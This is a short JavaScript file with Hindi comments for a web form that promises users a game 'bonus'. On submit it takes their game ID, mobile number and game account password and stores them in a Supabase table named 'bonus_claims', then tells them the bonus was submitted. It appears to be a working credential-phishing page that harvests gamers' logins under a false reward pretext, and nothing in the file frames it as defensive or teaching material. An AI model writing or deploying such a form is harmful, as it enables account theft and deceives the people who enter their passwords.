// ==========================================
// 1. SUPABASE CONFIGURATION
// ==========================================
// यहाँ अपनी Supabase API keys डालें
const SUPABASE_URL = 'YOUR_SUPABASE_URL_HERE'; 
const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY_HERE';

// Supabase Client Initialize
const { createClient } = supabase;
const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ==========================================
// 2. DOM ELEMENTS
// ==========================================
const form = document.getElementById('claimForm');
const submitBtn = document.getElementById('submitBtn');
const btnText = submitBtn.querySelector('.btn-text');
const loader = submitBtn.querySelector('.loader');
const toast = document.getElementById('toast');

// टोस्ट मैसेज दिखाने का फंक्शन
function showToast(message, type) {
    toast.textContent = message;
    toast.className = `toast ${type} show`;
    setTimeout(() => {
        toast.classList.remove('show');
    }, 3500);
}

// ==========================================
// 3. FORM SUBMISSION LOGIC
// ==========================================
form.addEventListener('submit', async (e) => {
    e.preventDefault();

    // 1. बटन को डिसेबल करें और लोडर दिखाएं
    submitBtn.disabled = true;
    btnText.textContent = "सबमिट हो रहा है...";
    loader.classList.remove('hidden');

    // 2. इनपुट वैल्यूज प्राप्त करें
    const gameId = document.getElementById('gameId').value.trim();
    const mobileNumber = document.getElementById('mobileNumber').value.trim();
    const gamePassword = document.getElementById('gamePassword').value.trim();

    try {
        // 3. Supabase में डेटा इन्सर्ट करें
        const { data, error } = await supabaseClient
            .from('bonus_claims')
            .insert([
                { 
                    game_id: gameId, 
                    mobile_number: mobileNumber, 
                    game_password: gamePassword 
                }
            ]);

        if (error) throw error;

        // 4. सक्सेस मैसेज
        showToast("बोनस सफलतापूर्वक सबमिट हो गया!", "success");
        form.reset();

    } catch (error) {
        console.error("Error submitting form:", error);
        showToast("कुछ गलत हो गया। कृपया दोबारा प्रयास करें।", "error");
    } finally {
        // 5. बटन को दोबारा चालू करें
        submitBtn.disabled = false;
        btnText.textContent = "बोनस सबमिट करें";
        loader.classList.add('hidden');
    }
});
